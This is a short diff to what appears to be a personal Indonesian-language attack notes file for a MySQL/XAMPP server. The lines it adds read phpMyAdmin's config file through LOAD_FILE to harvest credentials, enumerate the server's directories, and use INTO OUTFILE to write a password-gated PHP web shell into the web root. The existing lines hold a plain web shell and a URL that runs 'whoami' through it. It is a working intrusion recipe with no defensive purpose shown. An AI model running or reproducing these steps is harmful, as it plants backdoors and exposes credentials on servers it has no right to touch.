@@ -1,3 +1,32 @@
+
+SELECT LOAD_FILE('C:/xampp/phpmyadmin/config.inc.php');
+
+
+
+SELECT @@basedir;
+
+SELECT @@datadir;
+
+SHOW VARIABLES LIKE 'secure_file_priv';
+
+
+
+
+kalo gagal ubah ke local d
+
+SELECT '<?php if($_GET["pass"]=="Codex") system($_GET["cmd"]); ?>' 
+INTO OUTFILE 'D:/xampp/htdocs/assets.php';
+
+
+
+
+
+
+
+
+
+
+
 cara 1
 SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE 'D:/xampp/htdocs/assets.php';
 https://www.dummy.co.id/assets.php?cmd=whoami
